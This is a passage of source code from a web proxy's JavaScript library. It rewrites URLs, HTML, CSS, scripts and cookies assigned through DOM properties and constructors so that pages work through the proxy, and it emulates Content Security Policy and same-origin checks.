			_proxy_jslib_throw_csp_error("CSP form-action error: " + val) ;
		}
	    }

	case 'lowsrc':
	case 'formAction':
	case 'useMap':
	case 'longDesc':
	case 'cite':
	case 'codeBase':
	case 'location':
	case 'poster':
	    // don't convert if o is not a Node or a Location or a Window (including dup'ed of any)
	    if (!_proxy_jslib_instanceof(o, 'Node') && !_proxy_jslib_instanceof(o, 'Location') && !_proxy_jslib_instanceof(o, 'Window') )
		return eval('o[property]'+op+'val') ;
	    if (opmod!='') {
		new_val= _proxy_jslib_parse_full_url(o[property])[3] ;
		eval('new_val' + op + 'val') ;
	    } else {
		new_val= val ;
	    }

	    // this won't catch e.g. "top.location.href=u"... :P
	    if ((property=='location') && (o.top===o)) {
		o[property]= _proxy_jslib_full_url_by_frame(new_val, o.ownerDocument, 0) ;
	    } else if ( (o.ownerDocument &&
			 (o.ownerDocument.defaultView||o.ownerDocument.parentWindow)._proxy_jslib_base_unframes && o.target==void 0) ||
			(o.target && o.target.match(/^_(top|blank)$/i)) )
	    {
		o[property]= _proxy_jslib_full_url_by_frame(new_val, o.ownerDocument, 0) ;

	    } else if (property=='src' && _proxy_jslib_instanceof(o, 'Element') && o.nodeName.match(/^i?frame$/i)) {
		o[property]= _proxy_jslib_full_url_by_frame(new_val, o.ownerDocument, 1, void 0, 1) ;

	    } else if (property=='src' && _proxy_jslib_instanceof(o, 'Element') && o.nodeName.match(/^script$/i)) {
		var old_url_start= _proxy_jslib_url_start ;
		var flags_6= _proxy_jslib_flags[6] ;
		_proxy_jslib_flags[6]= ((o.type!=void 0) && (o.type!=''))  ? o.type  : _proxy_jslib_default_script_type ;
		try {
		    _proxy_jslib_url_start= _proxy_jslib_url_start_by_flags(_proxy_jslib_flags) ;
		    o[property]= _proxy_jslib_full_url(new_val, o.ownerDocument) ;
		} finally {
		    _proxy_jslib_url_start= old_url_start ;
		    _proxy_jslib_flags[6]= flags_6 ;
		}

	    } else {
		o[property]= _proxy_jslib_full_url(new_val, o.ownerDocument, void 0, void 0,
						   property=='src' && o.nodeName.match(/^i?frame$/i) ) ;
	    }
	    if (_proxy_jslib_instanceof(o, 'Window')) _proxy_jslib_init_domain(o) ;
	    // return unproxified value
	    return new_val ;


	case 'profile':
	    if (!o.tagName || o.tagName.toLowerCase()!='head')
		return o[property]= val ;
	    var u= val.split(/\s+/) ;
	    for (var i= 0 ; i<u.length ; i++)
		u[i]= _proxy_jslib_full_url(u[i], o.ownerDocument) ;
	    o[property]= u.join(' ') ;
	    return val ;

	case 'cssText':
	    if (_proxy_jslib_instanceof(o, 'CSSStyleDeclaration')) {
		o[property]= _proxy_jslib_proxify_css(val) ;
		return val ;
	    } else {
		return _assign_default() ;
	    }


	// these are properties of HTMLElement, i.e. could be one of many object types
	case 'innerHTML':
	    // only proxify it if the object is an HTMLElement or Document
	    // MSIE has trouble with instanceof  :P
	    if (!_proxy_jslib_instanceof(o, 'HTMLElement') && !_proxy_jslib_instanceof(o, 'Document'))
		return _assign_default() ;

	    // also avoid if it's in a script element, which jQuery uses
	    if (is_in_script(o, property))  return _assign_default() ;

	    if (op!='=') {
		// unproxify it first by calling _proxify_html() with reverse=true
		// unfortunately, innerHTML is sometimes used for <style> and <script> elements
		switch (o.tagName.toLowerCase()) {
		    case 'style':  new_val= _proxy_jslib_proxify_css(o[property], true) ; break ;
		    case 'script': new_val= _proxy_jslib_proxify_js(o[property], void 0, void 0, void 0, true) ; break ;
		    default:       new_val= _proxy_jslib_proxify_html(o[property], (o.ownerDocument || o), false, true)[0] ;
		}
		eval('new_val' + op + 'val') ;
		switch (o.tagName.toLowerCase()) {
		    case 'style':  o[property]= _proxy_jslib_proxify_css(new_val) ; break ;
		    case 'script': o[property]= _proxy_jslib_proxify_js(new_val) ; break ;
		    default:       o[property]= _proxy_jslib_proxify_html(new_val, (o.ownerDocument || o))[0] ;
		}
		return new_val ;
	    } else {
		switch (o.tagName.toLowerCase()) {
		    case 'style':  o[property]= _proxy_jslib_proxify_css(val) ; break ;
		    case 'script': o[property]= _proxy_jslib_proxify_js(val) ; break ;
		    default:       o[property]= _proxy_jslib_proxify_html(val, (o.ownerDocument || o))[0] ;
		}
		return val ;
	    }


	case 'outerHTML':
	case 'outerText':
	    // only proxify it if the object is an HTMLElement or Document
	    // MSIE has trouble with instanceof  :P
	    if (!_proxy_jslib_instanceof(o, 'HTMLElement') && !_proxy_jslib_instanceof(o, 'Document'))
		return _assign_default() ;

	    // also avoid if it's in a script element, which jQuery uses
	    if (is_in_script(o, property))  return _assign_default() ;

	    if (op!='=') {
		// unproxify it first by calling _proxify_html() with reverse=true
		new_val= _proxy_jslib_proxify_html(o[property], (o.ownerDocument || o), false, true)[0] ;
		eval('new_val' + op + 'val') ;
		return new_val ;
	    } else {
		o[property]= _proxy_jslib_proxify_html(val, (o.ownerDocument || o))[0] ;
		return val ;
	    }


	// same for properties of Node
	case 'nodeValue':
	    if (opmod!='') { eval('new_val= o[property]' + opmod + 'val') }
	    else           { new_val= val }
	    if (_proxy_jslib_instanceof(o, 'Attr')) {
		o[property]= _proxy_jslib_proxify_attribute(void 0, o, property, new_val) ;
	    } else if (_proxy_jslib_instanceof(o, 'Node')) {
		o[property]= _proxy_jslib_proxify_attribute(o, void 0, property, new_val) ;
	    }
	    return new_val ;


	// Various parts of Link and (dup'ed) Location objects

	case 'protocol':
	    if (_proxy_jslib_instanceof(o, 'Link') || _proxy_jslib_instanceof(o, 'Location')) {
		o.href= _proxy_jslib_full_url(val+'//'+(u[2]!='' ? u[2]+'@' : '')+u[3]+u[6]+u[7]+u[8], o.ownerDocument) ;
		if (_proxy_jslib_instanceof(o, 'Location')) o._proxy_jslib_original_win.location.href= o.href ;
		return val ;
	    } else {
		return _assign_default() ;
	    }

	case 'host':
	    if (_proxy_jslib_instanceof(o, 'Link') || _proxy_jslib_instanceof(o, 'Location')) {
		o.href= _proxy_jslib_full_url(u[1]+'//'+(u[2]!='' ? u[2]+'@' : '')+val+u[6]+u[7]+u[8], o.ownerDocument) ;
		if (_proxy_jslib_instanceof(o, 'Location')) o._proxy_jslib_original_win.location.href= o.href ;
		return val ;
	    } else {
		return _assign_default() ;
	    }

	case 'hostname':
	    if (_proxy_jslib_instanceof(o, 'Link') || _proxy_jslib_instanceof(o, 'Location')) {
		o.href= _proxy_jslib_full_url(u[1]+'//'+(u[2]!='' ? u[2]+'@' : '')+val+(u[5]!='' ? ':'+u[5] : '')+u[6]+u[7]+u[8], o.ownerDocument) ;
		if (_proxy_jslib_instanceof(o, 'Location')) o._proxy_jslib_original_win.location.href= o.href ;
		return val ;
	    } else {
		return _assign_default() ;
	    }

	case 'port':
	    if (_proxy_jslib_instanceof(o, 'Link') || _proxy_jslib_instanceof(o, 'Location')) {
		o.href= _proxy_jslib_full_url(u[1]+'//'+(u[2]!='' ? u[2]+'@' : '')+u[4]+(val!='' ? ':'+val : '')+u[6]+u[7]+u[8], o.ownerDocument) ;
		if (_proxy_jslib_instanceof(o, 'Location')) o._proxy_jslib_original_win.location.href= o.href ;
		return val ;
	    } else {
		return _assign_default() ;
	    }

	case 'pathname':
	    if (_proxy_jslib_instanceof(o, 'Link') || _proxy_jslib_instanceof(o, 'Location')) {
		o.href= _proxy_jslib_full_url(u[1]+'//'+(u[2]!='' ? u[2]+'@' : '')+u[3]+val+u[7]+u[8], o.ownerDocument) ;
		if (_proxy_jslib_instanceof(o, 'Location')) o._proxy_jslib_original_win.location.href= o.href ;
		return val ;
	    } else {
		return _assign_default() ;
	    }

	case 'search':
	    if (_proxy_jslib_instanceof(o, 'Link') || _proxy_jslib_instanceof(o, 'Location')) {
		o.href= _proxy_jslib_full_url(u[1]+'//'+(u[2]!='' ? u[2]+'@' : '')+u[3]+u[6]+val+u[8], o.ownerDocument) ;
		if (_proxy_jslib_instanceof(o, 'Location')) o._proxy_jslib_original_win.location.href= o.href ;
		return val ;
	    } else {
		return _assign_default() ;
	    }


	case 'cookie':
	    if (_proxy_jslib_instanceof(o, 'Document')) {
		// simple way to test validity of cookie
		var new_cookie= _proxy_jslib_cookie_to_client(val, o) ;
		if (new_cookie=='') return '' ;
		if (_proxy_jslib_USE_DB_FOR_COOKIES) {
		    _proxy_jslib_store_cookie_in_db(val) ;
		    var c= val.match(/^\s*([^\=]+\=[^\;]*)/)[1] ;
		    if (c!=void 0) _proxy_jslib_COOKIES_FROM_DB+= ';' + c ;
		    return _proxy_jslib_COOKIES_FROM_DB ;
		}
		return o.cookie= new_cookie ;
	    } else {
		return _assign_default() ;
	    }


	// We store w._proxy_jslib_document_domain as "scheme://hostname:port",
	//   but Document.domain uses only hostname.
	case 'domain':
	    if (_proxy_jslib_instanceof(o, 'Document')) {
		var w= o.defaultView || o.parentWindow ;
		if (!w._proxy_jslib_document_domain) _proxy_jslib_init_domain(w) ;
		if (!w._proxy_jslib_document_domain) return ;  // unsupported scheme
		var pwurl= _proxy_jslib_parse_url(w._proxy_jslib_document_domain) ;
		var old_domain= pwurl[4] ;
		if (old_domain.match(/^[\d\.]+$/)) {
		    alert('Warning: tried to change document.domain from an IP address: ['+old_domain+']') ;
		    return ;
		}
		val= val.replace(/\.+$/, '') ;
		// new domain must be suffix of old domain, must contain a
		//   ".", and must be a complete domain suffix of old value
		//   (tested here by prefixing with "." before suffix check,
		//   but allowing if strings are equal).
		if ( ( (('.'+val)==old_domain.slice(-val.length-1))
		      || (val==old_domain) )
		    && val.match(/\./) )
		{
		    return (w._proxy_jslib_document_domain= pwurl[1] + '//' + val + ':' + pwurl[5]) ;
		}
//		else alert('Warning: tried to set document.domain to illegal value: ['+val+'] existing domain: ['+w._proxy_jslib_document_domain+']') ;  // jsm
		break ;
	    } else {
		return _assign_default() ;
	    }


	case 'withCredentials':
	    if (_proxy_jslib_instanceof(o, 'XMLHttpRequest') || _proxy_jslib_instanceof(o, 'AnonXMLHttpRequest')) {
		if (typeof o._proxy_jslib_xhrdata.win=='number')
		    o._proxy_jslib_xhrdata.win= _proxy_jslib_xhrwins[o._proxy_jslib_xhrdata.win] ;
		if (o._proxy_jslib_xhrdata.anon)
		    throw new Error('InvalidAccessError setting XMLHttpRequest.withCredentials') ;
		if (o._proxy_jslib_xhrdata.win.document && o._proxy_jslib_xhrdata.sync)
		    throw new Error('InvalidAccessError setting XMLHttpRequest.withCredentials') ;
		return o.withCredentials= val ;
	    } else {
		return _assign_default() ;
	    }


	// various CSS settings

	case 'value':
	    if (_proxy_jslib_instanceof(o, 'Attr')) {
		if (opmod!='') {
		    new_val= _proxy_jslib_proxify_attribute(void 0, o, o.name, val, 1) ;
		    eval('new_val' + opmod + '= val') ;
		} else {
		    new_val= val ;
		}
		o.value= _proxy_jslib_proxify_attribute(void 0, o, o.name, new_val) ;
		return new_val ;
	    } else {
		return _assign_default() ;
	    }


	case 'background':
	case 'backgroundImage':
	case 'content':
	case 'cursor':
	case 'listStyle':
	case 'listStyleImage':
	    if (_proxy_jslib_instanceof(o, 'CSS2Properties') || _proxy_jslib_instanceof(o, 'CSSStyleDeclaration')) {
		o[property]= _proxy_jslib_proxify_css(val) ;
		return val ;
	    } else {
		return _assign_default() ;
	    }


	case 'text':
	case 'textContent':
	    if (_proxy_jslib_instanceof(o, 'Node')) {
		if (o.nodeName.match(/^script$/i)) {
		    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['script-src'], "'unsafe-inline'"))
			_proxy_jslib_throw_csp_error("CSP inline script-src error") ;
		    var type= o.type || _proxy_jslib_default_script_type ;
		    o[property]= _proxy_jslib_proxify_block(val, type,
			_proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS, 0) ;
		    return val ;
		} else if (o.nodeName.match(/^style$/i)) {
		    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['style-src'], "'unsafe-inline'"))
			_proxy_jslib_throw_csp_error("CSP inline style-src error") ;
		    var type= o.type || _proxy_jslib_default_style_type ;
		    o[property]= _proxy_jslib_proxify_block(val, type,
			_proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS, 0) ;
		    return val ;
		} else {
		    return _assign_default() ;
		}

	    } else {
		return _assign_default() ;
	    }



	default:
	    return _assign_default() ;
    }


    function _assign_default() {
	if (op=='++') return o[property]++ ;
	else if (op=='--') return o[property]-- ;
	else if (op=='=') return o[property]= val ;   // optimization to not use eval
	else return eval('o[property]'+op+'val') ;
    }
}



// This is used when the property in question IS being assigned to, WITHOUT an object.
// The value returned is the value to set the variable to.
function _proxy_jslib_assign_rval (prefix, property, op, val, cur_val) {

    // handle prefix
    if (prefix=='delete') return undefined ;  // not quite the same as delete, but close enough?
    if (prefix=='++') {
	val= 1 ;
	op= '+=' ;
    } else if (prefix=='--') {
	val=  1 ;
	op= '-=' ;
    }

    if (val && (typeof val=='object') && (!('toLowerCase' in val)))
	return val ;
    var new_val ;
    if (op=='=')
	new_val= val ;    // optimization to not use eval
    else {
	new_val= cur_val ;
	eval('new_val' + op + 'val') ;
    }

    switch (property) {
	// when there's no object, "location" is the only property that needs proxification
	case 'location':
	    return _proxy_jslib_full_url(new_val) ;
	default:
	    return new_val ;
    }
}



// Next two routines are used when in a with() block.
function _proxy_jslib_with_handle (with_objs, property, cur_val, calls_now, in_new_statement) {
    for (var i= with_objs.length-1 ; i>=0 ; i--)
	if (property in with_objs[i])
	    return _proxy_jslib_handle(with_objs[i], property, with_objs[i][property], calls_now, in_new_statement) ;
    return _proxy_jslib_handle(null, property, cur_val, calls_now, in_new_statement) ;
}

function _proxy_jslib_with_assign_rval (with_objs, prefix, property, op, val, cur_val) {
    for (var i= with_objs.length-1 ; i>=0 ; i--)
    if (property in with_objs[i])
	return _proxy_jslib_assign(prefix, with_objs[i], property, op, val) ;
    return _proxy_jslib_assign_rval(prefix, property, op, val, cur_val) ;
}



function _proxy_jslib_new(o) {
    // note that we need to match classes in other windows too
    // can't use Function.toString() or Object.toString() to reliably get
    //   class name portably, and accessing non-existant object types sometimes
    //   causes JS to crash, so we use this messy approach to get oclass for
    //   any classes we care about
    var oclass ;
    try { if (o===XMLHttpRequest) oclass= 'XMLHttpRequest' } catch (e) {}
    if (!oclass) try { if (o===AnonXMLHttpRequest) oclass= 'AnonXMLHttpRequest' } catch (e) {}
    if (!oclass) try { if (o===EventSource) oclass= 'EventSource' } catch (e) {}
    if (!oclass) try { if (o===WebSocket) oclass= 'WebSocket' } catch (e) {}
    if (!oclass) try { if (o===Worker) oclass= 'Worker' } catch (e) {}
    if (!oclass) try { if (o===SharedWorker) oclass= 'SharedWorker' } catch (e) {}
    if (!oclass) try { if (o===Audio) oclass= 'Audio' } catch (e) {}
    if (!oclass) try { if (o===Function) oclass= 'Function' } catch (e) {}
    // use Function.prototype.toString in case toString is overridden
    // MSIE adds \n to start of Function.toString()  :P
    if (!oclass) try { oclass= Function.prototype.toString.call(o).match(/^\n?function ([$\w.]*)/)[1] } catch (e) {}
    if (!oclass) oclass= '' ;

    if ((oclass=='EventSource') || (oclass=='WebSocket')) {
	if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['connect-src'], _proxy_jslib_absolute_url(arguments[1])))
	    _proxy_jslib_throw_csp_error("connect-src violation with " + oclass) ;
	arguments[1]= _proxy_jslib_full_url(arguments[1]) ;
    } else if ((oclass=='Worker') || (oclass=='SharedWorker')) {
	if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['script-src'], _proxy_jslib_absolute_url(arguments[1])))
	    _proxy_jslib_throw_csp_error("script-src violation with " + oclass) ;
	arguments[1]= _proxy_jslib_full_url(arguments[1]) ;
    } else if (oclass=='Audio') {
	arguments[1]= _proxy_jslib_full_url(arguments[1]) ;
    } else if (oclass=='Function') {
	if (!_proxy_jslib_eval_ok) _proxy_jslib_throw_csp_error("can't new Function without unsafe-eval") ;
	arguments[arguments.length-1]= _proxy_jslib_proxify_js(arguments[arguments.length-1]) ;
    }

    // eval() takes a while, so avoid it for most common cases
    var ret ;
    if (arguments.length==1) ret= new o ;
    else if (arguments.length==2) ret= new o(arguments[1]) ;
    else if (arguments.length==3) ret= new o(arguments[1], arguments[2]) ;
    else if (arguments.length==4) ret= new o(arguments[1], arguments[2], arguments[3]) ;
    else if (arguments.length==5) ret= new o(arguments[1], arguments[2], arguments[3], arguments[4]) ;
    else {
	var out_args= [] ;
	// Note starts with 1, not 0, since arguments[0] is o .
	for (var i= 1 ; i<arguments.length ; i++) out_args[i-1]= 'arguments[' + i + ']' ;
	var new_statement= 'new o(' + out_args.join(', ') + ')' ;
	ret= eval(new_statement) ;
    }

    // Bug in browsers: using a DOM object in ret._proxy_jslib_xhrdata (like "{win: window}")
    //   at this point crashes JS, and can't even trap it with try/catch.  But storing
    //   the windows in the _proxy_jslib_wins array, and setting the win property later,
    //   avoids the error.
    if (oclass=='XMLHttpRequest') {
	_proxy_jslib_xhrwins.push(window) ;
	ret._proxy_jslib_xhrdata= {origin: _proxy_jslib_origin,
				   win: _proxy_jslib_xhrwins.length-1
				  } ;
    } else if (oclass=='AnonXMLHttpRequest') {
	_proxy_jslib_xhrwins.push(window) ;
	ret._proxy_jslib_xhrdata= {origin: _proxy_jslib_origin,
				   win: _proxy_jslib_xhrwins.length-1,
				   anon: true
				  } ;
    }

    return ret ;
}


//---- below are used to support the API functions above ---------------


// This is used for a test handling 'innerHTML' etc.
function is_in_script(el, property) {
    if (!_proxy_jslib_instanceof(el, 'HTMLElement')) return 0 ;
    var p= property=='innerHTML'  ? el  : el.parentNode ;
    while (p) {
	if (p.tagName=='SCRIPT') return 1 ;
	p= p.parentNode ;
    }
    return 0 ;
}


function _proxy_jslib_write_via_buffer(doc, html) {
    var i, buf ;
    for (i= 0 ; i<_proxy_jslib_write_buffers.length ; i++) {
	if (_proxy_jslib_write_buffers[i].doc===doc) {
	    buf= _proxy_jslib_write_buffers[i] ;
	    break ;
	}
    }
    if (!buf) {
	buf= _proxy_jslib_write_buffers[_proxy_jslib_write_buffers.length]=
	    { doc: doc, buf: html } ;
    } else {
	if (buf.buf==void 0) buf.buf= '' ;
	buf.buf+= html ;
    }
//    _proxy_jslib_flush_write_buffer(buf) ;
}


// careful-- output of document.write() may be (erroneously?) parsed and
//   executed immediately after document.write() statement.  To help with
//   that, we clear the buffer before calling document.write().
// Hack here for JS insertions-- if document was created and nothing written on
//   it yet, then insert the JS library if needed.
// Another hack-- since _proxy_jslib_write_buffers may be reset if what's
//   written includes jslib, we exit the loop if that happens.
function _proxy_jslib_flush_write_buffers() {
    var buf, i, p ;

    for (i= 0 ; (_proxy_jslib_write_buffers!=void 0) && (i<_proxy_jslib_write_buffers.length) ; i++) {
	buf= _proxy_jslib_write_buffers[i] ;
	if (buf.buf==void 0) continue ;
 
	p= _proxy_jslib_proxify_html(buf.buf, buf.doc, !buf.has_jslib) ;
	if (p[3]) return ;   // found frame document
	buf.has_jslib= buf.has_jslib || p[2] ;
	buf.buf= p[1] ;
//	buf.doc.write(p[0]) ;
	// for when Document.write is redefined  :P
	// really should fix all other calls to Document.write(); they will
	//   currently double-proxify something, not cause a privacy hole
	var doc_write= HTMLDocument.prototype.write || Document.prototype.write ;
	doc_write.call(buf.doc, p[0]) ;
    }
}


function _proxy_jslib_flush_write_buffer(buf) {
    var p= _proxy_jslib_proxify_html(buf.buf, buf.doc, !buf.has_jslib) ;
    if (p[3]) return ;   // found frame document
    buf.has_jslib= buf.has_jslib || p[2] ;
//alert('in flush; in=['+buf.buf+']\n\nout=['+p[0]+']\n\nremainder=['+p[1]+']') ;
    buf.buf= p[1] ;
    // for when Document.write is redefined  :P
    var doc_write= HTMLDocument.prototype.write || Document.prototype.write ;
    doc_write.call(buf.doc, p[0]) ;
}



// include fields needed for type ID, plus any other "authorized" fields.
// this should really be redone....
function _proxy_jslib_dup_window_safe(w) {
    return { _proxy_jslib_original_window: w,
	     navigator:     w.navigator,
	     clearInterval: w.clearInterval,
	     moveBy:        w.moveBy,
	     self:          w,

	     location:      w.location,
	     postMessage:   function (message, targetOrigin, ports) {
				return _proxy_jslib_postMessage(w, message, targetOrigin, ports) ;
			    }
	   } ;
}


// since *some* sites do things like compare "top.location==self.location", we
//   have to keep a cache of locations
// we currently don't keep this up-to-date when values change, but we could....
function _proxy_jslib_dup_location(o) {
    var pl= _proxy_jslib_parse_full_url(o.location.href) ;   // o can be either Window or Document object
    var url= pl[3] || '' ;
    if (_proxy_jslib_locations[url]) return _proxy_jslib_locations[url] ;
    var is_in_frame= pl[2]  ? _proxy_jslib_unpack_flags(pl[2])[5]  : 0 ;
    pl= url  ? _proxy_jslib_parse_url(url)  : [] ;

    return _proxy_jslib_locations[url]=
	{ _proxy_jslib_original_win: o.defaultView||o.parentWindow||o,
	  hash:     pl[8],
	  host:     pl[3],
	  hostname: pl[4],
	  href:     pl[0],
	  pathname: pl[6],
	  port:     pl[5],
	  protocol: pl[1],
	  search:   pl[7],
	  origin:   (o.defaultView||o.parentWindow||o)._proxy_jslib_origin,    // non-standard

	  assign:   function (url) {
			return o.location.assign(_proxy_jslib_full_url_by_frame(url, o.document||o, is_in_frame)) ;
		    },
	  reload:   function (force) {
			return o.location.reload(force) ;
		    },
	  replace:  function (url) {
			return o.location.replace(_proxy_jslib_full_url_by_frame(url, o.document||o, is_in_frame)) ;
		    },
	  toString: function () {
			return this.href ;
		    }
	} ;
}


// used in two places
function _proxy_jslib_postMessage(win, message, targetOrigin, ports) {
    if ((targetOrigin=='*') || (targetOrigin=='/'))
	if (ports==void 0) {
	    return win.postMessage(message, targetOrigin) ;  // Firefox chokes on undefined ports
	} else {
	    return win.postMessage(message, targetOrigin, ports) ;
	}

    // security check-- targetOrigin must match win.location.href
    //   in scheme/host/port, unless win.location.href is empty or
    //   about:blank
    var u= _proxy_jslib_parse_full_url(win.location.href)[3] ;
    if (u && u!='about:blank') {
	var pu1= _proxy_jslib_parse_url(u) ;
	var pu2= _proxy_jslib_parse_url(targetOrigin) ;
	var port1= pu1[5] || (pu1[1]=='https'  ? 443  : 80) ;
	var port2= pu2[5] || (pu2[1]=='https'  ? 443  : 80) ;
	if ((pu1[1]!=pu2[1]) || (pu1[4]!=pu2[4]) || (port1!=port2))
	    return void 0 ;
    }

    // all postMessage's use _proxy_jslib_url_start; we enforce targetOrigin above
    if (ports==void 0) {
	return win.postMessage(message, _proxy_jslib_url_start) ;  // Firefox chokes on undefined ports
    } else {
	return win.postMessage(message, _proxy_jslib_url_start, ports) ;
    }
}


// Same-origin policy requires matching scheme, hostname, and port.
// This sets w._proxy_jslib_document_domain to "scheme://hostname:port", which
//   must be maintained.
// For about:blank pages, this sets w._proxy_jslib_document_domain to undefined.
// If the optional url parameter isn't provided, uses w.document.URL .
// Note that Document.domain only uses hostname; we accommodate this when getting
//   or setting it.
function _proxy_jslib_init_domain(w, url) {
    if (!url) {
	if (!w.location || !w.location.href || w.location.href=='about:blank') {
	    w._proxy_jslib_document_domain= void 0 ;
	    return ;
	}
	url= w.location.href.replace(/^wyciwyg:\/\/\d+\//i, '') ;
	url= _proxy_jslib_parse_full_url(url)[3] ;
	if (!url) return ;   // means on start page
	url= decodeURIComponent(url) ;
    }
    if (!url.match(/^(?:https?|ftp):/i)) {
	w._proxy_jslib_document_domain= void 0 ;
	return ;
    }
    var purl= _proxy_jslib_parse_url(url) ;
    purl[3]= purl[3].replace(/\.+$/, '') ;
    if (!purl[5]) purl[5]= (purl[1]=='http:')   ? 80
			 : (purl[1]=='https:')  ? 443
			 :                        0 ;
    if (!purl[5]) w._proxy_jslib_document_domain= void 0 ;
    else w._proxy_jslib_document_domain= purl[1] + '//' + purl[3] + ':' + purl[5] ;
}


// Return code to insert jslib and _proxy_jslib_pass_vars() call into an iframe.
// This is only needed for <iframe> elements with no src attribute or with a
//   "javascript:" src.
function _proxy_jslib_iframe_init_html() {
    var jslib_element= '<script class="_proxy_jslib_jslib" type="text/javascript" src="'
		     + _proxy_jslib_html_escape(_proxy_jslib_url_start_inframe
			 + _proxy_jslib_wrap_proxy_encode('x-proxy://scripts/jslib'))
		     + '"><\/script>\n' ;

    var base_url_jsq= document._proxy_jslib_base_url.replace(/(["\\])/g, function (p) { return "\\"+p } ) ;
    if (base_url_jsq!=void 0) base_url_jsq= '"' + base_url_jsq + '"' ;
    var cookies_from_db_jsq= _proxy_jslib_COOKIES_FROM_DB.replace(/(["\\])/g, function (p) { return "\\"+p } ) ;

    var pv_element= '<script class="_proxy_jslib_pv" type="text/javascript">_proxy_jslib_pass_vars('
		  + base_url_jsq + ',"'
		  + _proxy_jslib_origin + '", '
		  + _proxy_jslib_cookies_are_banned_here + ','
		  + _proxy_jslib_doing_insert_here + ','
		  + _proxy_jslib_SESSION_COOKIES_ONLY + ','
		  + _proxy_jslib_COOKIE_PATH_FOLLOWS_SPEC + ','
		  + _proxy_jslib_RESPECT_THREE_DOT_RULE + ','
		  + _proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS + ',"'
		  + _proxy_jslib_RTMP_SERVER_PORT + '","'
		  + _proxy_jslib_default_script_type + '","'
		  + _proxy_jslib_default_style_type + '",'
		  + _proxy_jslib_USE_DB_FOR_COOKIES + ','
		  + _proxy_jslib_PROXIFY_COMMENTS + ','
		  + _proxy_jslib_ALERT_ON_CSP_VIOLATION + ',"'
		  + cookies_from_db_jsq + '",'
		  + _proxy_jslib_TIMEOUT_MULTIPLIER + ',"'
		  + _proxy_jslib_csp_st + '")<\/script>' ;

    return jslib_element + pv_element ;
}


// returns proxified URL, relative to doc
function _proxy_jslib_full_url(uri_ref, doc, reverse, retain_query, is_frame_src) {
    var script, r_l, m1, m2, r_q, query,
	data_type, data_clauses, data_content, data_charset, data_base64 ;

    if (!uri_ref) return uri_ref ;

    // Disable retain_query until potential anonymity issues are resolved.
    retain_query= false ;

    // Apparently some non-string objects are passed here... Location? Link?
    uri_ref= uri_ref.toString() ;

    // Hack to prevent double-proxified URLs in SWFs, meaning we can't chain
    //   through the same script location.
    // This also helps to avoid double-proxifying bugs in general.
    if (!reverse && (uri_ref.indexOf(_proxy_jslib_SCRIPT_URL)==0))
	return uri_ref ;

    // leave blob: URLs unchanged
    if (uri_ref.match(/^blob\:/i)) return uri_ref ;

    // hack for my.yahoo.com; it creates the non-functional src="//:" on purpose (?)
    if (uri_ref=='//:') return uri_ref ;

    if (!doc) doc= window.document ;

//if (uri_ref==null) alert('null; caller=['+arguments.callee.caller+']') ;  // caller==null
//if (uri_ref.match(/\/[01]{6}[A-Z]\//)) alert('in full_url; uri_ref, caller=\n['+uri_ref+']\n['+arguments.callee.caller+']') ;   // jsm
    if (uri_ref==null) return '' ;
    if (reverse) return _proxy_jslib_parse_full_url(uri_ref)[3] ;

    if (!doc._proxy_jslib_base_url) _proxy_jslib_set_base_vars(doc, _proxy_jslib_parse_full_url(doc.URL)[3]) ;

    uri_ref= uri_ref.replace(/^\s+|\s+$/g, '') ;
//    if (/^x\-proxy\:\/\//i.test(uri_ref))  return '' ;
    if (uri_ref.match(/^about\:\s*blank$/i))  return uri_ref ;

    if (/^(javascript|livescript)\:/i.test(uri_ref)) {
	if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['script-src'], "'unsafe-inline'"))
	    _proxy_jslib_throw_csp_error("CSP inline script-src error: 'javascript:' URL") ;
	script= uri_ref.replace(/^(javascript|livescript)\:/i, '') ;
	r_l= _proxy_jslib_separate_last_js_statement(script) ;
	r_l[1]= r_l[1].replace(/\s*;\s*$/, '') ;

	// special case-- frames with src attribute of "javascript:..."
	if (is_frame_src) {
	    return "javascript: '<body>"
		 + _proxy_jslib_iframe_init_html().replace(/(['\\])/g, function (p) { return "\\"+p } )
		 + "<script>"
		 + _proxy_jslib_proxify_js(r_l[0], 0).replace(/(['\\])/g, function (p) { return "\\"+p } )
		 + "; document.write(_proxy_jslib_proxify_html("
		 + _proxy_jslib_proxify_js(r_l[1], 0).replace(/(['\\])/g, function (p) { return "\\"+p } )
		 + ")[0])</script></body>'" ;
	}

	return 'javascript:' + _proxy_jslib_proxify_js(r_l[0], 1)
	     + '; _proxy_jslib_proxify_html(' + _proxy_jslib_proxify_js(r_l[1], 0) + ')[0]' ;

    // The "FSCommand:" URL may be called by Flash apps.
    } else if (m1= uri_ref.match(/^(fscommand:)(.*)/i)) {
	return m1[1] + _proxy_jslib_proxify_js(m1[2]) ;
    
    } else if (m1= uri_ref.match(/^data:([\w\.\+\$\-]+\/[\w\.\+\$\-]+)?;?([^\,]*)\,?(.*)/i)) {
	data_type= m1[1].toLowerCase() ;
	if (data_type=='text/html' || data_type=='text/css' || data_type.match(/script/i)) {
	    data_clauses= m1[2].split(/;/) ;
	    data_content= m1[3] ;
	    for (var i= 0 ; i<data_clauses.length ; i++) {
		if (m2= data_clauses[i].match(/^charset=(\S+)/i)) {
		    data_charset= m2[1] ;
		} else if (data_clauses[i].toLowerCase()=='base64') {
		    data_base64= 1 ;
		}
	    }
	    data_content= data_base64
			? atob(data_content)
			: data_content.replace(/%([\da-fA-F]{2})/g,
			  function (s,p1) { return String.fromCharCode(eval('0x'+p1)) } ) ;   // probably slow
	    data_content= (data_type=='text/html')  ? _proxy_jslib_proxify_html(data_content)[0]
						    : _proxy_jslib_proxify_block(data_content, data_type, 1) ;
	    data_content= btoa(data_content) ;
	    return data_charset  ? 'data:' + data_type + ';charset=' + data_charset + ';base64,' + data_content
				 : 'data:' + data_type + ';base64,' + data_content ;
	} else {
	    return uri_ref ;
	}
    }

    var uf= uri_ref.match(/^([^\#]*)(\#.*)?/) ;
    var uri= uf[1] ;
    var frag=  uf[2] || '' ;
    if (uri=='')  return uri_ref ;

    uri= uri.replace(/[\r\n]/g, '') ;

    if (retain_query) {
	r_q= uri.split(/\?/) ;
	uri= r_q[0] ;
	query= r_q[1] ;
	if (query) query= '?'+query ;
	else query= '' ;
